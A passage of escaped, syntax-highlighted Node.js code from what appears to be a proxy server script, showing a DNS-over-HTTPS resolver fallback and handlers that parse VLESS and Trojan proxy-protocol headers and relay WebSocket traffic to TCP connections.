class=\"o\"\u003e=\u003c/span\u003e response.data\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003edata.Status \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e data.Answer \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e data.Answer.length \u0026gt; 0\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          const \u003cspan class=\"nv\"\u003eip\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e data.Answer.find\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003erecord\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; record.type \u003cspan class=\"o\"\u003e===\u003c/span\u003e 1\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eip\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            resolve\u003cspan class=\"o\"\u003e(\u003c/span\u003eip.data\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        tryNextDNS\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      .catch\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        tryNextDNS\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    tryNextDNS\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// VLE-SS处理\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e handleVlessConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"o\"\u003e[\u003c/span\u003eVERSION\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e1, 17\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!id.every\u003cspan class=\"o\"\u003e((\u003c/span\u003ev, i\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003ev\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e parseInt\u003cspan class=\"o\"\u003e(\u003c/span\u003euuid.substr\u003cspan class=\"o\"\u003e(\u003c/span\u003ei * 2, 2\u003cspan class=\"o\"\u003e)\u003c/span\u003e, 16\u003cspan class=\"o\"\u003e)))\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e17, 18\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt8\u003cspan class=\"o\"\u003e()\u003c/span\u003e + 19\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003e0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt8\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e ? msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 4\u003cspan class=\"o\"\u003e)\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;.\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e :\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e2\u003c/span\u003e ? new TextDecoder\u003cspan class=\"o\"\u003e()\u003c/span\u003e.decode\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei + 1, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e + msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, i + 1\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt8\u003cspan class=\"o\"\u003e()))\u003c/span\u003e :\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e ? msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 16\u003cspan class=\"o\"\u003e)\u003c/span\u003e.reduce\u003cspan class=\"o\"\u003e((\u003c/span\u003es, b, i, a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e(\u003c/span\u003ei % \u003cspan class=\"m\"\u003e2\u003c/span\u003e ? s.concat\u003cspan class=\"o\"\u003e(\u003c/span\u003ea.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei - 1, i + 1\u003cspan class=\"o\"\u003e))\u003c/span\u003e : s\u003cspan class=\"o\"\u003e)\u003c/span\u003e, \u003cspan class=\"o\"\u003e[])\u003c/span\u003e.map\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; b.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003e0\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e(\u003c/span\u003e16\u003cspan class=\"o\"\u003e))\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e : \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ws.send\u003cspan class=\"o\"\u003e(\u003c/span\u003enew Uint8Array\u003cspan class=\"o\"\u003e([\u003c/span\u003eVERSION, 0\u003cspan class=\"o\"\u003e]))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eduplex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e createWebSocketStream\u003cspan class=\"o\"\u003e(\u003c/span\u003ews\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resolveHost\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    .then\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eresolvedIP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host: resolvedIP, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    .catch\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Tro-jan处理\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e handleTrojanConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.length \u0026lt; 58\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003ereceivedPasswordHash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 56\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003epossiblePasswords\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      UUID,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ematchedPassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e null\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003econst \u003cspan class=\"nb\"\u003epwd\u003c/span\u003e of possiblePasswords\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e crypto.createHash\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;sha224\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.update\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.digest\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hex\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e receivedPasswordHash\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ematchedPassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e pwd\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!matchedPassword\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 56\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emsg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0d \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset + 1\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003ecmd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ecmd !\u003cspan class=\"o\"\u003e==\u003c/span\u003e 0x01\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan 